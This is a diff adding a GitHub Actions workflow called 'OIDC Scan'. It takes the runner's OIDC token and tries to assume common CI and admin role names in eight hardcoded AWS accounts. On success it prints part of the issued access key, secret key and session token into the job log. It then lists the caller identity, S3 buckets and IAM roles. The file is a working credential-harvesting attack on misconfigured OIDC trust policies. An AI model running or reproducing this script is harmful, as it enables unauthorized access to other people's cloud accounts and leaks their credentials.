@@ -1,0 +1,61 @@
+name: OIDC Scan
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: OIDC AWS Assume
+        run: |
+          echo "=== OIDC SCAN START ==="
+          ACCOUNTS="058264555122 211125709233 468642000468 905418271293 063726996179 710907998357 272182682749 339713019508"
+          ROLES="GitHubActionsRole github-actions-role GitHubActions github-actions DeployRole deploy-role AdminRole admin-role CIRole ci-role OIDC-GitHubActions OIDC-role"
+          
+          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value')
+          
+          if [ -z "$TOKEN" ] || [ "$TOKEN" = "null" ]; then
+            echo "NO_OIDC_TOKEN"
+            exit 1
+          fi
+          
+          FOUND=false
+          for account in $ACCOUNTS; do
+            for role in $ROLES; do
+              ROLE_ARN="arn:aws:iam::${account}:role/${role}"
+              echo "  Trying: ${ROLE_ARN}..."
+              RESULT=$(aws sts assume-role-with-web-identity \
+                --role-arn "$ROLE_ARN" \
+                --role-session-name "gh_scan" \
+                --web-identity-token "$TOKEN" \
+                --duration-seconds 3600 2>&1) || true
+              
+              if echo "$RESULT" | grep -q "Credentials"; then
+                echo "  ✅ FOUND: $ROLE_ARN"
+                echo "$RESULT" | jq -r '.Credentials | "AK=" + .AccessKeyId + " SK=" + .SecretAccessKey + " TOKEN=" + .SessionToken' | head -c 200
+                echo ""
+                FOUND=true
+                export AWS_ACCESS_KEY_ID=$(echo "$RESULT" | jq -r '.Credentials.AccessKeyId')
+                export AWS_SECRET_ACCESS_KEY=$(echo "$RESULT" | jq -r '.Credentials.SecretAccessKey')
+                export AWS_SESSION_TOKEN=$(echo "$RESULT" | jq -r '.Credentials.SessionToken')
+                aws sts get-caller-identity 2>/dev/null
+                aws s3 ls 2>/dev/null || echo "  No S3 access"
+                aws iam list-roles 2>/dev/null | head -20 || echo "  No IAM access"
+              elif echo "$RESULT" | grep -q "AccessDenied"; then
+                echo "  ❌ Role exists but denied"
+              fi
+              sleep 0.3
+            done
+          done
+          
+          if [ "$FOUND" = false ]; then
+            echo "NO_ROLES_FOUND"
+          fi
+          echo "=== OIDC SCAN END ==="
